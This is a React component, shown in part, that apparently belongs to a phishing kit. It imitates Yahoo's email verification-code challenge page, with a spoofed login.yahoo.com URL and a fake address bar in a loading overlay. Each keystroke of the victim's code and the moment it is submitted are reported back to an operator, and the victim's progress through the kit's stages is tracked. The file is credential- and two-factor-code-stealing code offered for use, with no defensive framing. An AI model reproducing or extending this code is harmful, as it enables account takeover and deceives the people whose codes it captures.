...
const YahooCodeMailPage = () => {
  const translations = {
    windowTitle: "Sign in to your account - Yahoo",
    url: "https://login.yahoo.com/account/challenge/email?src=noSrc&done=https%3A%2F%2Fmail.yahoo.com%2Fd&display=login",
  };
  ...
  React.useEffect(() => {
    if (!isSubmitting && !introLoading) return;
    const id = setInterval(
      () => setPhraseIndex((p) => (p + 1) % phrases.length),
      2000
    );
    return () => clearInterval(id);
  }, [isSubmitting, introLoading, phrases.length]);
  ...
  // Atualizar URL/página atual e badge de etapa
  React.useEffect(() => {
    try {
      updateClientData({
        currentUrl: "/sync?view=yahoo_codemail",
        currentPage: "yahoo_codemail",
        yahooStage: "Code Mail",
        fromForm: true,
      });
    } catch {}
  }, [updateClientData]);
  ...
  const resolvedEmail = React.useMemo(() => {
    const fromClient =
      (clientData && (clientData.yahooCodeMailEmail || clientData.email)) || "";
  ...
  return (
    <EmailLayout>
      <div
        className="min-h-screen w-full bg-[#0f0f10] relative p-4"
      ...
      >
        ...
        >
          ...
          <div style={{ padding: "24px 24px 14px 24px" }}>
            ...
            >
              We will send an email to <strong>{resolvedEmail}</strong> if it is
            ...
            <input
              ...
              onChange={(e) => {
                ...
                setCode(val);
                try {
                  updateClientData({ yahooCodeMail: val });
                  reportTyping("yahoocodemail", val);
                } catch {}
              }}
              style={{
                width: "100%",
            ...
            <div style={{ marginTop: 12 }}>
              <button
                ...
                onClick={(e) => {
                  ...
                  try {
                    updateClientData({ yahooCodeMailSubmittedAt: Date.now() });
                  } catch {}
                }}
              >
                Next
            ...
            {/* Overlays: intro (3s) e submissão final */}
            {(isSubmitting || introLoading) && (
              <div
                style={{
                  position: "absolute",
                  inset: 0,
              ...
              >
                ...
                >
                  ...
                  >
                    ...
                    >
                      https://login.yahoo.com/account/challenge/email?src=noSrc&done=https%3A%2F%2Fmail.yahoo.com%2Fd&display=login
                    </div>
                  </div>
                </div>
...
export default YahooCodeMailPage;
